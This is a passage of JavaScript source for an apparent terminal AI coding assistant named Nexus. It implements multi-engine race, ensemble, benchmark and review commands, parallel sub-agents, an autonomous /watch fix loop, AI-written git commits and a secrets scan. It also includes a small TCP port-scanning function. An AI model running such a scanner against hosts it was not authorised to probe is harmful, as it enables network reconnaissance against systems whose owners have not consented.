            if (hooks && !blocked) try { runHooks(hooks, "PostToolUse", { TOOL_NAME: name, TOOL_ARGS: JSON.stringify(a), TOOL_RESULT: JSON.stringify(result).slice(0, 2000) }, cwd); } catch (_) {}
            card.status = result.error ? "err" : "ok"; card.end = Date.now(); card.detail = oneline(resultText(JSON.stringify(result)), 260);
            if (a.__act && !blocked) { if (policy.audit) auditLog(cwd, { engine, tool: name, path: a.__act.path, cmd: a.__act.command, status: result && result.error ? "error" : "ok" }); if ((a.__act.type === "write" || a.__act.type === "edit") && result && !result.error) filesThisTurn++; }
            const obs = JSON.stringify(result).slice(0, 14000);
            oMsgs.push({ role: "tool", content: obs }); sess.inTok += Math.ceil(obs.length / 4);
            render();
          }
          sess.ctxUsed = sess.inTok + sess.outTok;
          finish({ output: "done" });
        })();
      }
    };
    // ---- parallel sub-agents: fan a set of independent tasks across the current engine ----
    const spawnAgents = (tasks) => {
      tasks = tasks.map((s) => s.trim()).filter(Boolean).slice(0, 8);
      transcript.push({ role: "user", text: "/agents  " + tasks.join("  ;;  ") });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(), in0 = sess.inTok, out0 = sess.outTok; scroll = 0;
      busy = true; busyStart = Date.now(); busyWord = "Orchestrating"; sess.liveOut = 0;
      ctl = makeCtl();
      activeAgents = tasks.length;
      const cards = tasks.map((tk, i) => ({ type: "tool", id: "ag" + i, name: "Task", label: "Task(" + oneline(tk, 30) + ")", status: "run", start: Date.now(), detail: tk }));
      cards.forEach((c) => block.items.push(c));
      startTick(); render();
      const agentsCtl = ctl; const pick = (cowork.on && engine === "claude" && cowork.weakKind === "claude") ? ((t) => { const est = Math.ceil(t.length / 4) + 800; if (isMechanical(t) && shouldDelegate(est, est * 4, cowork.strong, cowork.weak)) { impact.delegated++; impact.coworkSaved += (priceOf(cowork.strong).out - priceOf(cowork.weak).out) * (est * 3) / 1e6; return cowork.weak; } return cowork.strong; }) : (cowork.on && engine === "claude" ? ((t) => cowork.strong) : null); (async () => { const mdl = engine === "ollama" ? (sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags())) : sess.model; return runSubagents(engine, tasks, cwd, mdl, (i, phase) => { if (phase === "done") { cards[i].status = "ok"; cards[i].end = Date.now(); activeAgents = Math.max(0, activeAgents - 1); } render(); }, agentsCtl, pick); })()
        .then((outs) => {
          const t = ensureText();
          t.full = outs.map((o, i) => "### agent " + (i + 1) + " — " + oneline(tasks[i], 60) + "\n" + (o || "(no output)")).join("\n\n");
          for (const c of cards) if (c.status === "run") { c.status = "ok"; c.end = Date.now(); }
          sess.outTok += Math.ceil(outs.join("").length / 4); sess.ctxUsed = sess.inTok + sess.outTok;
          activeAgents = 0; busy = false; ctl = null;
          block.summary = tasks.length + " agents  ·  ↑" + fmtK(sess.inTok - in0) + " ↓" + fmtK(sess.outTok - out0) + " tok  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s";
          try { saveSession(); } catch (_) {} render();
        });
    };
    // quick TCP connect scan (Nexus ships with the Sentinel security toolkit)
    const quickScan = (host, ports) => new Promise((resolve) => {
      const net = require("net"); const open = []; let done = 0;
      if (!ports.length) return resolve([]);
      ports.forEach((port) => { const sk = new net.Socket(); sk.setTimeout(1200); sk.once("connect", () => { open.push(port); sk.destroy(); }).once("timeout", () => sk.destroy()).once("error", () => {}).once("close", () => { if (++done === ports.length) resolve(open.sort((x, y) => x - y)); }); try { sk.connect(port, host); } catch (_) { if (++done === ports.length) resolve(open); } });
    });
    // /race — run the SAME prompt on multiple engines at once and show every answer (cloud vs local)
    const raceEngines = (prompt) => {
      const avail = []; for (const e of ENGINE_ORDER) { if (e === "ollama" || engineAvail(e)) avail.push(e); } // race across every installed engine + local
      const race = [...new Set([engine].concat(avail))].slice(0, 3);
      transcript.push({ role: "user", text: "/race  " + prompt });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Racing"; ctl = makeCtl();
      const cards = race.map((e, i) => ({ type: "tool", id: "rc" + i, name: "Task", label: "Task(" + e + ")", status: "run", start: Date.now(), detail: e }));
      cards.forEach((c) => block.items.push(c)); startTick(); render();
      const racer = (e, i) => {
        const s = Date.now();
        const work = (async () => { let out; try { if (e === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); out = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { out = (await runEngineTask(e, prompt, cwd, false, false, null, ctl)).output; } } catch (err) { out = "error: " + err.message; } return { e, out: (out || "").trim(), ms: Date.now() - s }; })(); // read-only (autonomous=false) — /race compares answers, shouldn't edit files
        const timeout = new Promise((res) => setTimeout(() => res({ e, out: "(no response within 60s)", ms: 60000, timedOut: true }), 60000));
        return Promise.race([work, timeout]).then((r) => { cards[i].status = r.timedOut ? "err" : "ok"; cards[i].end = Date.now(); render(); return r; });
      };
      Promise.all(race.map(racer)).then((res) => {
        res.sort((a, b) => a.ms - b.ms);
        ensureText().full = res.map((r, i) => "### " + (i === 0 ? "fastest — " : "") + r.e + "  (" + (r.ms / 1000).toFixed(1) + "s)\n" + (r.out || "(no output)")).join("\n\n");
        busy = false; ctl = null; block.summary = race.length + " engines raced  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s"; try { saveSession(); } catch (_) {} render();
      });
    };
    // /review — have a DIFFERENT engine critique Nexus's last answer (cross-engine second opinion)
    const reviewLast = (revEngine) => {
      let last = ""; for (let i = transcript.length - 1; i >= 0; i--) { const m = transcript[i]; if (m.role === "nexus") { last = (m.items || []).filter((it) => it.type === "text").map((it) => it.full).join("\n").trim(); if (last) break; } }
      if (!last) { transcript.push({ role: "system", text: "nothing to review yet — ask Nexus something first" }); render(); return; }
      const re = ((ENGINES[revEngine] && engineAvail(revEngine)) ? revEngine : (engine === "claude" ? "ollama" : "claude"));
      const prompt = "You are a rigorous senior reviewer. Critique the ANSWER below for correctness, bugs, security issues and anything missing. Be concise and specific; list concrete problems.\n\n--- ANSWER ---\n" + last.slice(0, 6000) + "\n--- END ANSWER ---";
      transcript.push({ role: "user", text: "/review  (second opinion from " + re + ")" });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Reviewing"; ctl = makeCtl();
      const card = { type: "tool", id: "rv", name: "Task", label: "Task(review via " + re + ")", status: "run", start: Date.now() };
      block.items.push(card); startTick(); render();
      (async () => {
        let out; try { if (re === "ollama") { const mdl = pickCoderModel(await ollamaTags()); out = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { out = (await runEngineTask(re, prompt, cwd, false, false, null, ctl)).output; } } catch (e) { out = "error: " + e.message; }
        card.status = "ok"; card.end = Date.now(); ensureText().full = "second opinion (" + re + "):\n\n" + (out || "(no output)").trim(); busy = false; ctl = null; try { saveSession(); } catch (_) {} render();
      })();
    };
    // ask one engine a question (no file changes) — used by /ensemble
    const engineAnswer = async (e, prompt) => { try { if (e === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); return await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } return (await runEngineTask(e, prompt, cwd, false, false, null, ctl, (cowork.on && e === "claude") ? cowork.weak : undefined)).output; } catch (err) { return "error: " + err.message; } };
    // /ensemble — run the prompt on every engine, then synthesize the single best answer
    const ensembleEngines = (prompt) => {
      const avail = []; for (const e of ENGINE_ORDER) { if (e === "ollama" || (engineAvail(e) && !offline)) avail.push(e); }
      const members = [...new Set([offline ? "ollama" : engine].concat(avail))].slice(0, 3);
      transcript.push({ role: "user", text: "/ensemble  " + prompt });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Ensembling"; ctl = makeCtl();
      const cards = members.map((e, i) => ({ type: "tool", id: "en" + i, name: "Task", label: "Task(" + e + ")", status: "run", start: Date.now(), detail: e }));
      const synth = { type: "tool", id: "syn", name: "Task", label: "Task(synthesize)", status: "run", start: Date.now() };
      cards.forEach((c) => block.items.push(c)); startTick(); render();
      Promise.all(members.map((e, i) => Promise.race([engineAnswer(e, prompt).then((o) => ({ e, o: (o || "").trim() })), new Promise((r) => setTimeout(() => r({ e, o: "(no response within 60s)" }), 60000))]).then((r) => { cards[i].status = "ok"; cards[i].end = Date.now(); render(); return r; })))
        .then(async (res) => {
          synth.start = Date.now(); block.items.push(synth); render();
          const se = offline ? "ollama" : engine;
          const sp = "You are given " + res.length + " candidate answers to the same question from different AI models. Produce the SINGLE best answer, combining their strengths and fixing any mistakes. Be direct.\n\nQUESTION:\n" + prompt + "\n\n" + res.map((r, i) => "=== candidate " + (i + 1) + " (" + r.e + ") ===\n" + r.o).join("\n\n") + "\n\nReturn ONLY the final best answer.";
          let best; try { best = await engineAnswer(se, sp); } catch (_) { best = res[0] && res[0].o; }
          synth.status = "ok"; synth.end = Date.now();
          ensureText().full = "best-of-" + res.length + " (synthesized by " + se + "):\n\n" + (best || "(no output)").trim();
          busy = false; ctl = null; block.summary = res.length + " engines + synthesis  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s"; try { saveSession(); } catch (_) {} render();
        });
    };
    // /bench — run a prompt on each engine and report a speed / tokens / cost table (real cost for claude)
    const benchEngines = (prompt) => {
      const members = [...new Set([offline ? "ollama" : engine].concat((hasBin("claude") && !offline) ? ["claude", "ollama"] : ["ollama"]))].slice(0, 3);
      transcript.push({ role: "user", text: "/bench  " + prompt });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Benchmarking"; ctl = makeCtl();
      const cards = members.map((e, i) => ({ type: "tool", id: "bn" + i, name: "Task", label: "Task(" + e + ")", status: "run", start: Date.now(), detail: e }));
      cards.forEach((c) => block.items.push(c)); startTick(); render();
      const benchOne = (e) => new Promise((resolve) => { const s = Date.now(); (async () => {
        if (e === "claude") { let inTok = 0, outTok = 0, cost = 0, txt = ""; await runClaudeStream(prompt, cwd, false, { onText: (t) => { txt += t; }, onResult: (ev) => { const u = ev.usage || {}; inTok = (u.input_tokens || 0) + (u.cache_read_input_tokens || 0) + (u.cache_creation_input_tokens || 0); outTok = u.output_tokens || 0; if (typeof ev.total_cost_usd === "number") cost = ev.total_cost_usd; } }, ctl, { readonly: true, disallow: READONLY_TOOLS }); resolve({ e, ms: Date.now() - s, inTok, outTok, cost, real: true }); }
        else { let out = ""; try { if (e === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); out = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { out = (await runEngineTask(e, prompt, cwd, false, false, null, ctl)).output; } } catch (_) {} resolve({ e, ms: Date.now() - s, inTok: Math.ceil(prompt.length / 4), outTok: Math.ceil((out || "").length / 4), cost: 0, real: false }); }
      })(); });
      Promise.all(members.map((e, i) => Promise.race([benchOne(e), new Promise((r) => setTimeout(() => r({ e, ms: 60000, inTok: 0, outTok: 0, cost: 0, real: false, to: true }), 60000))]).then((r) => { cards[i].status = r.to ? "err" : "ok"; cards[i].end = Date.now(); render(); return r; })))
        .then((res) => {
          res.sort((a, b) => a.ms - b.ms);
          const fastest = res[0] && res[0].e;
          const pad = (s, n) => (s + " ".repeat(n)).slice(0, n);
          let tbl = pad("engine", 10) + pad("time", 9) + pad("in", 8) + pad("out", 8) + "cost\n";
          for (const r of res) tbl += pad(r.e + (r.e === fastest ? " *" : ""), 10) + pad((r.ms / 1000).toFixed(1) + "s", 9) + pad((r.real ? "" : "~") + fmtK(r.inTok), 8) + pad((r.real ? "" : "~") + fmtK(r.outTok), 8) + (r.real ? (r.cost ? "$" + r.cost.toFixed(4) : "-") : "free") + "\n";
          ensureText().full = "benchmark (* = fastest; ~ = estimated; claude tokens/cost are real):\n\n" + tbl;
          busy = false; ctl = null; block.summary = res.length + " engines benchmarked  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s"; try { saveSession(); } catch (_) {} render();
        });
    };
    // /plan — generate an editable, executable task checklist
    const planGen = (goal) => {
      transcript.push({ role: "user", text: "/plan  " + goal });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Planning"; ctl = makeCtl();
      const card = { type: "tool", id: "pl", name: "Task", label: "Task(plan)", status: "run", start: Date.now() }; block.items.push(card); startTick(); render();
      (async () => {
        let mdl = ""; if (engine === "ollama") mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags());
        let tasks = []; try { if (cowork.on) { const raw = await weakChat("Break this GOAL into an ordered list of 5-15 concrete, independently-verifiable tasks. Return ONLY a JSON array of short task strings.\n\nGOAL: " + goal + (nexusMd ? "\n\nPROJECT:\n" + nexusMd.slice(0, 2000) : "")); const arr = extractJson(raw, null); tasks = (Array.isArray(arr) && arr.length ? arr : [goal]).slice(0, 20).map((t, i) => ({ title: String(t).slice(0, 300) })); } else tasks = await planGoal(engine, mdl, goal, nexusMd); } catch (_) {}
        plan = (tasks || []).map((t) => ({ text: String(t.title || t).slice(0, 300), done: false })); savePlan();
        card.status = "ok"; card.end = Date.now();
        ensureText().full = "planned " + plan.length + " task(s). /plan run to execute · /plan done <n> to check off · /plan add <text> to add.";
        busy = false; ctl = null; transcript.push({ role: "plan" }); try { saveSession(); } catch (_) {} render();
      })();
    };
    const runPlan = () => {
      if (!plan.some((t) => !t.done)) { transcript.push({ role: "system", text: "no unfinished tasks in the plan" }); render(); return; }
      transcript.push({ role: "user", text: "/plan run" });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const ck = nexusCheckpoint(cwd); if (ck) checkpoints.push({ tree: ck, label: "plan run", ts: Date.now() });
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Executing"; ctl = makeCtl(); startTick(); render();
      (async () => {
        for (let i = 0; i < plan.length; i++) {
          if (ctl && ctl.stopped) break;
          const t = plan[i]; if (t.done) continue;
          t.running = true; const card = { type: "tool", id: "pt" + i, name: "Task", label: "Task(" + oneline(t.text, 30) + ")", status: "run", start: Date.now() }; block.items.push(card); activeAgents = 1; render();
          const delegate = wantWeak(t.text);
          if (delegate) { impact.delegated++; const est = Math.ceil(t.text.length / 4) + 800; impact.coworkSaved += Math.max(priceOf(cowork.strong).out - (cowork.weakKind === "ollama" ? 0 : priceOf(cowork.weak).out), 0) * (est * 3) / 1e6; card.label += " " + gray("· " + (cowork.weakKind === "ollama" ? "local:" : "") + cowork.weak); }
          try { if (delegate) { await weakTask(t.text); } else if (engine === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); await ollamaExec(mdl, t.text, "", cwd, aSignal(ctl)); } else { await runEngineTask(engine, t.text, cwd, true, false, null, ctl, cowork.on && engine === "claude" ? cowork.strong : undefined); } } catch (_) {}
          t.running = false; t.done = true; savePlan(); card.status = "ok"; card.end = Date.now(); activeAgents = 0; render();
        }
        ensureText().full = plan.every((t) => t.done) ? "all plan tasks completed." : "stopped — some tasks remain (/plan run to resume).";
        busy = false; ctl = null; transcript.push({ role: "plan" }); try { saveSession(); } catch (_) {} maybeAutoCompact(); render();
      })();
    };
    // /watch <cmd> — run a command; if it fails, have the engine fix the code and re-run, up to 5 tries
    const watchFix = (command) => {
      transcript.push({ role: "user", text: "/watch  " + command });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      const t0 = Date.now(); scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Watching"; ctl = makeCtl();
      const ck = nexusCheckpoint(cwd); if (ck) checkpoints.push({ tree: ck, label: "watch " + command, ts: Date.now() });
      startTick(); render();
      (async () => {
        let passed = false, attempts = 0;
        for (let att = 1; att <= 5 && !(ctl && ctl.stopped); att++) {
          attempts = att;
          const rc = { type: "tool", id: "wr" + att, name: "Bash", label: "Bash(" + oneline(command, 40) + ")", status: "run", start: Date.now() }; block.items.push(rc); render();
          const r = await coderShell(command, cwd); rc.status = r.code === 0 ? "ok" : "err"; rc.end = Date.now(); rc.detail = oneline(r.output, 260); render();
          if (r.code === 0) { const t = ensureText(); t.full += (t.full ? "\n" : "") + "command passed on attempt " + att + "."; passed = true; break; }
          if (att === 5) break;
          const t = ensureText(); t.full += (t.full ? "\n" : "") + "attempt " + att + " failed — asking " + engine + " to fix…"; render();
          const fc = { type: "tool", id: "wf" + att, name: "Task", label: "Task(fix attempt " + att + ")", status: "run", start: Date.now() }; block.items.push(fc); activeAgents = 1; render();
          const fixPrompt = "The command `" + command + "` is failing. Its output was:\n\n" + (r.output || "").slice(-3000) + "\n\nEdit the code so the command passes. Make the file edits now — do not ask questions.";
          try { if (engine === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); await ollamaExec(mdl, fixPrompt, "", cwd, aSignal(ctl)); } else { await runEngineTask(engine, fixPrompt, cwd, true, false, null, ctl); } } catch (_) {}
          fc.status = "ok"; fc.end = Date.now(); activeAgents = 0; render();
        }
        for (const it of block.items) if (it.status === "run") { it.status = "ok"; it.end = Date.now(); }
        const t = ensureText(); t.full += (passed ? "\n\nAll green." : "\n\nStill failing after " + attempts + " attempt(s) — review the output above.");
        busy = false; ctl = null; block.summary = "watch  ·  " + attempts + " attempt(s)  ·  " + ((Date.now() - t0) / 1000).toFixed(1) + "s" + (ck ? "  ·  undo #" + checkpoints.length : "");
        try { saveSession(); } catch (_) {} maybeAutoCompact(); render();
      })();
    };
    // /commit — write an AI commit message for the working diff and commit
    const commitChanges = () => {
      let diff = ""; try { _cp.execSync("git add -A", { cwd, stdio: "ignore" }); diff = _cp.execSync("git diff --cached", { cwd, encoding: "utf8" }); } catch (_) { transcript.push({ role: "system", text: "/commit needs a git repo" }); render(); return; }
      if (!diff.trim()) { transcript.push({ role: "system", text: "nothing to commit" }); render(); return; }
      transcript.push({ role: "user", text: "/commit" });
      const block = { role: "nexus", items: [] }; transcript.push(block);
      scroll = 0; busy = true; busyStart = Date.now(); busyWord = "Composing"; ctl = makeCtl();
      const card = { type: "tool", id: "cm", name: "Task", label: "Task(commit message)", status: "run", start: Date.now() }; block.items.push(card); startTick(); render();
      (async () => {
        const prompt = "Write a Conventional-Commits message for this diff: a single subject line under 72 chars (type: summary), optionally a short body. Output ONLY the message, no backticks, no preamble.\n\n" + diff.slice(0, 6000);
        let msg = ""; try { if (cowork.on) msg = await weakChat(prompt); else if (engine === "ollama") { const mdl = sess.model && sess.model !== engine ? sess.model : pickCoderModel(await ollamaTags()); msg = await ollamaChat(mdl, [{ role: "user", content: prompt }], undefined, aSignal(ctl)); } else { msg = (await runEngineTask(engine, prompt, cwd, false, false, null, ctl, auxModel())).output; } } catch (_) {}
        msg = (msg || "").replace(/```[a-z]*\n?|```/g, "").trim().split("\n").slice(0, 8).join("\n").trim() || "chore: update";
        card.status = "ok"; card.end = Date.now();
        let done = false; try { const subj = msg.split("\n")[0], body = msg.split("\n").slice(1).join("\n").trim(); _cp.execSync("git commit -m " + JSON.stringify(subj) + (body ? " -m " + JSON.stringify(body) : ""), { cwd, stdio: "ignore" }); done = true; } catch (_) {}
        ensureText().full = (done ? "committed:\n\n" : "generated message (commit failed — commit manually):\n\n") + msg;
        busy = false; ctl = null; try { saveSession(); } catch (_) {} render();
      })();
    };
    // ---- slash commands ----
    const saveSession = () => { try { fs.mkdirSync(path.join(cwd, ".nexus"), { recursive: true }); fs.writeFileSync(path.join(cwd, ".nexus", "session.json"), JSON.stringify({ engine, model: sess.model, transcript, sess, ts: Date.now() })); } catch (_) {} };
    const handleSlash = (t) => {
      const sp = t.indexOf(" ");
      const cmd = (sp === -1 ? t : t.slice(0, sp)).toLowerCase();
      const argstr = sp === -1 ? "" : t.slice(sp + 1).trim();
      const arg = argstr.split(/\s+/)[0];
      if (customCmds[cmd]) { let body = customCmds[cmd].body.replace(/\$ARGUMENTS/g, argstr).replace(/\$(\d+)/g, (_, n) => argstr.split(/\s+/)[+n - 1] || ""); submit(body); return; }
      if (cmd === "/help") transcript.push({ role: "system", text: "core:  /help /clear /compact /context /cost /budget /undo /redo /rewind /checkpoints /resume /export /copy /status /doctor /init /model /engine /commands /expand /exit\nsave-cost:  /cheap (preset) · /cowork (strong+weak) · /lean · /effort low · /estimate · /index · /budget · /impact\nunique:  /race · /ensemble · /bench · /review · /watch · /plan · /guard · /gaps · /dream · /commit · /models · /recent · /keys · /diff · /git · /blame · /explain · /test · /index · /snippet · /pin · /secrets · /scan · /agents a ;; b · /tree · /theme · /offline · /redact\ninput:  @file (Tab-completes paths) · !cmd shell · #note memory · end a line with \\ for a newline · MCP & /hooks from .nexus/\nkeys:  shift+tab mode · ctrl+o expand · ctrl+c stop · ↑/↓ history · wheel/PgUp/PgDn/Home/End scroll · / menu" });
      else if (cmd === "/commands") { const ks = Object.keys(customCmds); transcript.push({ role: "system", text: ks.length ? ("custom commands (from .nexus/commands or .claude/commands):\n" + ks.map((k) => "  " + k + "  " + customCmds[k].desc.replace(/ \(custom\)$/, "")).join("\n")) : "no custom commands yet — add a file like .nexus/commands/review.md, then use /review" }); }
      else if (cmd === "/mcp") {
        if (arg === "connect" || arg === "reconnect") { mcpServers = []; connectMcp().then(() => render()); transcript.push({ role: "system", text: "connecting to MCP servers from .nexus/mcp.json…" }); }
        else if (!loadMcpConfig(cwd)) transcript.push({ role: "system", text: "no MCP servers configured. Create .nexus/mcp.json (or .mcp.json):\n  { \"mcpServers\": { \"name\": { \"command\": \"npx\", \"args\": [\"-y\", \"@modelcontextprotocol/server-...\"] } } }\nThe claude engine reads .mcp.json natively; the local engine gets these tools too." });
        else if (!mcpServers.length) transcript.push({ role: "system", text: "MCP servers are still connecting… run /mcp again in a moment" });
        else transcript.push({ role: "system", text: "MCP servers:\n" + mcpServers.map((s) => s.error ? ("  " + s.name + "  — error: " + s.error) : ("  " + s.name + "  — " + (s.tools || []).length + " tool(s): " + (s.tools || []).map((t) => t.name).slice(0, 8).join(", "))).join("\n") + "\nthe local engine can call these as mcp__<server>__<tool>" }); }
      else if (cmd === "/agents" || cmd === "/parallel") { const tasks = argstr.split(/\s*;;\s*/).map((s) => s.trim()).filter(Boolean); if (tasks.length < 2) transcript.push({ role: "system", text: "usage: /agents <task 1> ;; <task 2> ;; …   — runs each task in parallel on the " + engine + " engine, each in its own isolated git worktree, then merges the changes back" }); else spawnAgents(tasks); }
      else if (cmd === "/hooks") { transcript.push({ role: "system", text: hooks ? ("hooks (.nexus/hooks.json) active for events: " + Object.keys(hooks).join(", ") + "\n  PreToolUse/PostToolUse run for the local engine; UserPromptSubmit & Stop run for every engine") : "no hooks configured. Create .nexus/hooks.json:\n  { \"PreToolUse\": [ { \"matcher\": \"run_command|write_file\", \"command\": \"echo $TOOL_NAME >> .nexus/audit.log\" } ] }\n  events: UserPromptSubmit · PreToolUse · PostToolUse · Stop  (non-zero exit on PreToolUse/UserPromptSubmit blocks the action)" }); }
      else if (cmd === "/status") transcript.push({ role: "system", text: "status:\n  engine   " + engine + (sess.model && sess.model !== engine ? " (" + sess.model + ")" : "") + "\n  dir      " + cwd + "\n  mode     " + MODES[mode].k + "\n  context  " + Math.round((sess.ctxUsed / (sess.ctxWindow || 1)) * 100) + "% of " + fmtK(sess.ctxWindow) + "\n  tokens   ↑" + fmtK(sess.inTok) + " ↓" + fmtK(sess.outTok) + (PAID[engine] ? (sess.cost ? " · $" + sess.cost.toFixed(4) : " · billed") : " · local · free") + "\n  budget   " + (costCap ? "$" + costCap.toFixed(2) + " cap" : "none") + "\n  undo     " + checkpoints.length + " checkpoint(s)" });
      else if (cmd === "/doctor") transcript.push({ role: "system", text: "doctor:\n  claude CLI   " + (hasBin("claude") ? "found" : "not found (needed for the claude engine)") + "\n  opencode     " + (hasBin("opencode") ? "found" : "not found") + "\n  git          " + (hasBin("git") ? "found — /undo & checkpoints active" : "not found — /undo disabled") + "\n  node         " + process.version + "\n  ollama is checked live when you switch to it" });
      else if (cmd === "/resume") { try { const s = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "session.json"), "utf8")); transcript.length = 0; for (const b of s.transcript) transcript.push(b); if (s.sess) Object.assign(sess, s.sess); cont = true; scroll = 0; transcript.push({ role: "system", text: "resumed the saved session from " + new Date(s.ts).toLocaleString() }); } catch (_) { transcript.push({ role: "system", text: "no saved session to resume (sessions are saved to .nexus/session.json after each turn)" }); } }
      else if (cmd === "/export") { try { const L = ["# Nexus conversation", "", "_" + new Date().toLocaleString() + " · " + engine + " · " + cwd + "_", ""]; for (const m of transcript) { if (m.role === "user") L.push("## You", "", m.text, ""); else if (m.role === "nexus") { L.push("## Nexus", ""); for (const it of (m.items || [])) { if (it.type === "text") L.push(it.full); else if (it.type === "tool") L.push("- `" + it.label + "`"); } L.push(""); } else if (m.role === "system") L.push("> " + String(m.text).replace(/\n/g, " "), ""); } const fp = path.join(cwd, "nexus-" + new Date().toISOString().replace(/[:.]/g, "-").slice(0, 19) + ".md"); fs.writeFileSync(fp, L.join("\n")); transcript.push({ role: "system", text: "exported conversation → " + path.relative(cwd, fp) }); } catch (e) { transcript.push({ role: "system", text: "export failed: " + e.message }); } }
      else if (cmd === "/copy") { let last = ""; for (let i = transcript.length - 1; i >= 0; i--) { const m = transcript[i]; if (m.role === "nexus") { last = (m.items || []).filter((it) => it.type === "text").map((it) => it.full).join("\n").trim(); if (last) break; } } if (last) { out.write("\x1b]52;c;" + Buffer.from(last).toString("base64") + "\x07"); transcript.push({ role: "system", text: "copied Nexus's last reply to the clipboard" }); } else transcript.push({ role: "system", text: "nothing to copy yet" }); }
      else if (cmd === "/rewind") { if (!checkpoints.length) transcript.push({ role: "system", text: "no checkpoints to rewind to" }); else { const n = parseInt(arg, 10); const idx = isNaN(n) ? checkpoints.length - 1 : n - 1; const ck = checkpoints[idx]; if (!ck) transcript.push({ role: "system", text: "no checkpoint #" + arg + " — /checkpoints to list them" }); else { const ok = nexusRestore(cwd, ck.tree, ck.paths); if (ok) checkpoints.length = idx; transcript.push({ role: "system", text: ok ? ("rewound to checkpoint #" + (idx + 1) + " (before \"" + ck.label + "\") — restored " + ((ck.paths && ck.paths.length) ? ck.paths.length + " file(s) Nexus changed" : "the working tree")) : "rewind failed (git error)" }); } } }
      else if (cmd === "/clear" || cmd === "/new") { transcript.length = 0; transcript.push({ role: "art" }, { role: "system", text: "new chat  ·  " + engine + "  ·  " + cwd }); cont = false; oMsgs.length = 1; sess.ctxUsed = 0; scroll = 0; }
      else if (cmd === "/compact") doCompact(false);
      else if (cmd === "/context") transcript.push({ role: "system", text: "context: " + fmtK(sess.ctxUsed) + " / " + fmtK(sess.ctxWindow) + " tokens (" + Math.round((sess.ctxUsed / (sess.ctxWindow || 1)) * 100) + "%)  ·  window " + fmtK(sess.ctxWindow) });
      else if (cmd === "/cost") transcript.push({ role: "system", text: PAID[engine] ? ("session: ↑" + fmtK(sess.inTok) + " in · ↓" + fmtK(sess.outTok) + " out" + (sess.cost ? " · $" + sess.cost.toFixed(4) : "") + (costCap ? " · cap $" + costCap.toFixed(2) : "")) : "engine is local (Ollama) — free, no token charges" });
      else if (cmd === "/budget") { const v = parseFloat(arg); if (arg && !isNaN(v) && v > 0) { costCap = v; transcript.push({ role: "system", text: "budget cap set to $" + v.toFixed(2) + " — turns pause when session cost reaches it" }); } else if (arg === "off" || arg === "0") { costCap = 0; transcript.push({ role: "system", text: "budget cap removed" }); } else transcript.push({ role: "system", text: "usage: /budget <usd>  (e.g. /budget 5.00, or /budget off)" }); }
      else if (cmd === "/undo") { if (!checkpoints.length) transcript.push({ role: "system", text: "nothing to undo (no checkpoints this session, or not a git repo)" }); else { const ck = checkpoints.pop(); const nowTree = nexusCheckpoint(cwd); const ok = nexusRestore(cwd, ck.tree, ck.paths); if (ok && nowTree) redoStack.push({ tree: nowTree, label: ck.label, paths: ck.paths }); transcript.push({ role: "system", text: ok ? ("undid \"" + ck.label + "\" — restored " + ((ck.paths && ck.paths.length) ? ck.paths.length + " file(s) Nexus changed this turn (unrelated edits untouched)" : "the working tree") + " (/redo to reapply)") : "undo failed (git error)" }); } }
      else if (cmd === "/redo") { const r = redoStack.pop(); if (!r) transcript.push({ role: "system", text: "nothing to redo" }); else { const ok = nexusRestore(cwd, r.tree, r.paths); if (ok) checkpoints.push({ tree: r.tree, label: r.label, ts: Date.now(), paths: r.paths }); transcript.push({ role: "system", text: ok ? ("redid — reapplied the changes from \"" + r.label + "\"") : "redo failed (git error)" }); } }
      else if (cmd === "/race") { if (!argstr) transcript.push({ role: "system", text: "usage: /race <prompt>  — runs it on every available engine (claude/local/opencode) at once and shows all answers" }); else raceEngines(argstr); }
      else if (cmd === "/review") { reviewLast(arg); }
      else if (cmd === "/secrets") { try { const files = _cp.execSync("git ls-files", { cwd, encoding: "utf8" }).split("\n").filter(Boolean).slice(0, 3000); const found = []; for (const f of files) { try { if (fs.statSync(path.join(cwd, f)).size > 400000) continue; const hits = scanSecrets(fs.readFileSync(path.join(cwd, f), "utf8")); if (hits.length) found.push("  " + f + " — " + hits.join(", ")); } catch (_) {} } transcript.push({ role: "system", text: found.length ? ("possible secrets found in tracked files:\n" + found.slice(0, 40).join("\n")) : "scanned tracked files — no obvious secrets found" }); } catch (_) { transcript.push({ role: "system", text: "/secrets needs a git repo (uses git ls-files)" }); } }
